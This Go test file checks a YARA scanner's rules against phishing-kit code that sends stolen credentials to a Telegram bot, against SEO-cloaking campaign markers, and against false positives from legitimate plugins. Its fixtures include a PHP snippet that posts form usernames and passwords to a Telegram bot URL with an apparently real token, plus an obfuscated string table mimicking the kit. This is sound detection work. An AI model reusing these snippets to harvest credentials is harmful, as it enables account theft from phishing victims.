//go:build yara

package yara

import (
	"bytes"
	"testing"
)

// A bank-phishing kit found on production exfiltrated the victim's document
// number and password to a hardcoded Telegram bot. Nothing detected the
// endpoint itself: the kit reached the findings list only through a generic
// obfuscation rule, and its HTML, its hidden PHP, and its search-console
// takeover files were never reported at all.

func hexEscape(s string) string {
	var b bytes.Buffer
	for _, c := range []byte(s) {
		b.WriteString("\\x")
		const digits = "0123456789abcdef"
		b.WriteByte(digits[c>>4])
		b.WriteByte(digits[c&0x0f])
	}
	return b.String()
}

func TestTelegramExfil_ObfuscatedEndpointDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Shape of the real kit: an escaped string table holding the bot endpoint,
	// the captured field names, and the send call.
	mal := []byte(`var _$_149e=["` +
		hexEscape("https://api.telegram.org/bot") + `","` +
		hexEscape("/sendMessage") + `","` +
		hexEscape("password") + `","` +
		hexEscape("getElementById") + `"];`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_telegram_bot_credentials") {
		t.Error("exfil_telegram_bot_credentials: obfuscated Telegram exfil endpoint not detected")
	}
}

func TestTelegramExfil_HardcodedTokenWithCredentialCapture(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
$token = "https://api.telegram.org/bot7206520169:AAEOSycSlMRM2t33oPFl8MB1Hd7ALDUCcts/sendMessage";
$msg = "user: " . $_POST['user'] . " password: " . $_POST['password'];
file_get_contents($token . "?chat_id=-1002456099969&text=" . urlencode($msg));
`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_telegram_bot_credentials") {
		t.Error("exfil_telegram_bot_credentials: hardcoded bot token harvesting credentials not detected")
	}
}

func TestTelegramExfil_LegitNotificationPluginNotFlagged(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// A real notification plugin reads its token from options and sends
	// order notices; there is no hardcoded token and no credential capture.
	legit := []byte(`<?php
/* Plugin Name: Order Notifications for Telegram */
function otn_send($order_id) {
    $token   = get_option('otn_bot_token');
    $chat_id = get_option('otn_chat_id');
    $url     = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    wp_remote_post($url, array('body' => array(
        'chat_id' => $chat_id,
        'text'    => sprintf(__('New order #%d received', 'otn'), $order_id),
    )));
}
`)
	if hasYaraRule(s.ScanBytes(legit), "exfil_telegram_bot_credentials") {
		t.Error("exfil_telegram_bot_credentials FP: matched a notification plugin that reads its token from options and sends no credentials")
	}
}

func TestTelegramExfil_DocumentationMentionNotFlagged(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
// Setup: create a bot with @BotFather, then call
// https://api.telegram.org/bot<your-token>/sendMessage to verify delivery.
// Store the token in wp-config.php; never commit your password.
`)
	if hasYaraRule(s.ScanBytes(legit), "exfil_telegram_bot_credentials") {
		t.Error("exfil_telegram_bot_credentials FP: matched setup documentation with a placeholder token")
	}
}

// seo_cloak_group14_ioc replaces the suppressed ESET_IIS_Group14, whose
// crawler-user-agent arm fired on stock analytics plugins.

func TestGroup14IOC_CampaignMarkersDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php $u = "/utf.php?key=" . $k; $s = "/self.php?v=" . $v; echo file_get_contents($u . $s);`)
	if !hasYaraRule(s.ScanBytes(mal), "seo_cloak_group14_ioc") {
		t.Error("seo_cloak_group14_ioc: campaign infrastructure markers not detected")
	}
}

func TestGroup14IOC_CrawlerUserAgentListNotFlagged(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// The pixelyoursite shape that produced the false positive: a bot-filter
	// table plus a forwarded-for lookup, and no campaign infrastructure.
	legit := []byte(`<?php
class PYS {
    private $bots = array('Baiduspider', '360Spider', 'Sogou', 'YisouSpider', 'Yahoo! Slurp');
    public function is_bot() {
        $ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        foreach ($this->bots as $b) {
            if (stripos($_SERVER['HTTP_USER_AGENT'], $b) !== false) { return true; }
        }
        return false;
    }
}
`)
	for _, rule := range []string{"seo_cloak_group14_ioc", "ESET_IIS_Group14"} {
		if hasYaraRule(s.ScanBytes(legit), rule) {
			t.Errorf("%s FP: matched an analytics plugin's crawler user-agent table", rule)
		}
	}
}
